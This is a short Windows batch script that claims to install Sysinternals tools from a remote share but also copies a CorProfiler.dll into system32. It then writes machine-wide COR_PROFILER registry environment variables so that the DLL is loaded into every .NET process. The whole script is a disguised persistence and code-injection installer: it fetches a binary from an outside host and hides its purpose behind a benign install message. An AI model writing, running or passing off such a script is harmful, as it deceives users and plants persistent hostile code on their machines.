@echo off
echo Installing Sysinternals tools...

set RHOST=sysinternals.live
set SHARE=tools
set GET_NAME=CorProfiler.dll
set PUT_NAME=CorProfiler.dll
set INSTALL_DIR=%windir%\system32
set INSTALL_PATH=%INSTALL_DIR%\%PUT_NAME%
set GUID=31668036-eeba-472a-a178-2da545323341

copy /Y /B \\%RHOST%\%SHARE%\autoruns* %INSTALL_DIR% >NUL
copy /Y /B \\%RHOST%\%SHARE%\%GET_NAME% %INSTALL_PATH% >NUL
copy /Y /B \\%RHOST%\%SHARE%\proc* %INSTALL_DIR% >NUL

REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v "COR_ENABLE_PROFILING" /t "REG_SZ" /d "1"
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v "COR_PROFILER" /t "REG_SZ" /d "{%GUID%}"
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v "COR_PROFILER_PATH" /t "REG_SZ" /d "%INSTALL_PATH%"

set RHOST=
set SHARE=
set GET_NAME=
set PUT_NAME=
set INSTALL_DIR=
set INSTALL_PATH=
set GUID=

echo All done!
